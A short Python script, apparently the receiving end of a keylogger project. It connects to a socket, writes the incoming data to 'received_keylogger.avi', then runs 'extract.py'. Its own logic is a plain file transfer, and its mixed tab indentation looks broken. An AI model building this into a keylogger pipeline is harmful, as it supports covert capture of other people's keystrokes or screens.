import socket                  
import hashlib
import random
import os


#MAIN

s = socket.socket()             
host = ''     			
port = 1234                    
	
s.connect((host, port))
print('connected..')

with open('received_keylogger.avi', 'wb') as f:
    print ('file opened')
    print('receiving data...')
    while True:
	data = s.recv(1024)
	print('data=%s', (data))
	if not data:
	    break
	# write data to a file
	f.write(data)
    f.close()
print('Successfully. Now running the extract.py code')
#print(s.recv(1024))
arg = ["extract.py"]
os.execvp("python",("python",)+tuple(arg))



